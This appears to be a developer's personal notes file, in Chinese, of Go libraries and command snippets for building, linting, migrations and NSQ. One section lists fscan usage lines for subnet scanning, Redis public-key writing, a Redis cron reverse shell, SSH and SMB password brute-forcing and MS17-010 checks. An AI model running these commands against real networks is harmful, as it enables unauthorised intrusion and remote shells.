https://github.com/zh-five/xdaemon
https://github.com/duolatech/xapimanager

https://github.com/bmizerany/pat
https://github.com/julienschmidt/httprouter
https://github.com/zenazn/goji
https://github.com/gin-gonic/gin
github.com/astaxie/beego
https://github.com/revel/revel

https://github.com/bilibili/kratos

http://www.golangnote.com/topic/87.html
https://github.com/stripe/einhorn

Martini

https://github.com/lunny/tango
https://github.com/gin-gonic/gin
https://github.com/go-martini/martini
https://github.com/astaxie/beego
https://github.com/valyala/fasthttp
https://github.com/robfig/revel
https://github.com/plimble/ace

https://github.com/coocood/freecache
https://github.com/outbrain/orchestrator
https://github.com/antonholmquist/jason
https://github.com/olahol/melody
https://github.com/gorilla/websocket
https://github.com/smartystreets/goconvey
https://github.com/name5566/leaf
https://github.com/tsuru/tsuru
https://github.com/leanote/leanote
https://github.com/tealeg/xlsx
http://git.oschina.net/openmeeting2/openmeeting2
https://github.com/PuerkitoBio/goquery
https://github.com/hybridgroup/gobot
https://github.com/google/gxui

https://github.com/astaxie/beedb

https://github.com/go-chassis/go-chassis
https://github.com/TruthHun/DocHub
https://github.com/rodrigo-brito/gocity

容器安全扫描
https://github.com/knqyf263/trivy

https://github.com/snail007/goproxy

https://github.com/XiaoMi/Gaea

https://github.com/douyu/jupiter

命令行解析
https://github.com/alecthomas/kingpin
日期操作
https://github.com/golang-module/carbon

生成GO文件过大问题2.3M变900K
go build -ldflags -w go-safe-hosts.go
upx压缩
https://github.com/upx/upx/releases
brew install upx
upx -9 -k go-safe-hosts

go mod init etms
GO代码检测
curl -sfL https://raw.githubusercontent.com/securego/gosec/master/install.sh | sh -s -- -b $(go env GOPATH)/bin latest
https://github.com/securego/gosec
gosec -help
time gosec ./...
gosec -include=G101,G203,G401 ./...
gosec -exclude=G303 ./...

go 打包到不同平台windows linux运行程序
1、Mac下编译Linux, Windows平台的64位可执行程序：
$ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build test.go
$ CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build test.go
2、Linux下编译Mac, Windows平台的64位可执行程序：
$ CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build test.go
$ CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build test.go
3、Windows下编译Mac, Linux平台的64位可执行程序：
$ SET CGO_ENABLED=0SET GOOS=darwin3 SET GOARCH=amd64 go build test.go
$ SET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build  test.go
注：如果编译web等工程项目，直接cd到工程目录下直接执行以上命令
GOOS：目标可执行程序运行操作系统，支持 darwin freebsd linux windows android netbsd openbsd plan9
GOARCH：目标可执行程序操作系统构架，包括 386 amd amd64 arm arm64

实时性能监控
https://github.com/grafana/grafana
https://github.com/prometheus/prometheus
https://github.com/netdata/netdata

go get -u github.com/cosmtrek/air
air -c .air.toml


数据库迁移
安装：
$ go get -u -d github.com/golang-migrate/migrate/cmd/migrate
键入命令创建迁移文件：
migrate create -ext sql -dir database/migrations -seq create_user
键入命令运行迁移：
migrate -database "mysql://user:pass@tcp(localhost:3600)/user" -path=database/migrations up
键入命令中断迁移：
migrate -database "mysql://user:pass@tcp(localhost:3600)/user" -path=database/migrations down
golang-migrate/migrate:https://github.com/golang-migrate/migrate

https://github.com/shadow1ng/fscan
fscan.exe -h 192.168.1.1/24  (默认使用全部模块)
fscan.exe -h 192.168.1.1/16  (B段扫描)
fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) 
fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
fscan.exe -hf ip.txt  (以文件导入)


https://github.com/go-playground/validator
https://github.com/bytedance/go-tagexpr
github.com/valyala/fasttemplate
github.com/rsms/gotalk
github.com/valyala/bytebufferpool
https://github.com/jianfengye/collection
https://github.com/x1unix/go-playground
https://github.com/gwuhaolin/livego
https://github.com/hantmac/fuckdb
https://github.com/orcaman/concurrent-map
https://github.com/megaease/easegress
https://github.com/nocodb/nocodb
https://github.com/Canop/rhit

GO 混搅工具
go get -u github.com/unixpickle/gobfuscate
结构体检查
go get -u github.com/mdempsky/maligned

https://github.com/golang-migrate/migrate
桌面分享
https://github.com/pavlobu/deskreen

https://github.com/ClickHouse/clickhouse-go
github.com/panjf2000/ants

https://github.com/nsqio/nsq/releases

nohup ./nsqlookupd &
nohup ./nsqd --lookupd-tcp-address=127.0.0.1:4160 &
nohup ./nsqadmin --lookupd-http-address=127.0.0.1:4161 &
nohup ./nsq_to_file --topic=test --output-dir=/tmp --lookupd-http-address=127.0.0.1:4161 &

curl -d 'hello world' 'http://127.0.0.1:4151/pub?topic=test'
http://192.168.110.131:4171/

GO进度条 可视化操作
https://github.com/charmbracelet/bubbles
https://github.com/charmbracelet/bubbletea
https://github.com/vbauerster/mpb

https://github.com/aohorodnyk/mimeheader
日志
https://github.com/uber-go/zap
https://github.com/rs/zerolog
https://github.com/apex/log
https://github.com/sirupsen/logrus

https://github.com/kjk/dailyrotate

Go 的 goroutine 池
https://github.com/Jeffail/tunny

断路器
https://github.com/rubyist/circuitbreaker


https://github.com/minio/minio-go
https://github.com/felixge/httpsnoop
gRPC 客户端调试工具
https://github.com/ktr0731/evans
https://github.com/uw-labs/bloomrpc
https://github.com/storyicon/powerproto

发布订阅
https://github.com/ThreeDotsLabs/watermill/

go install github.com/fzipp/gocyclo/cmd/gocyclo@latest
gocyclo -top 10  ./

go get -u github.com/hhatto/gocloc/cmd/gocloc
gocloc .

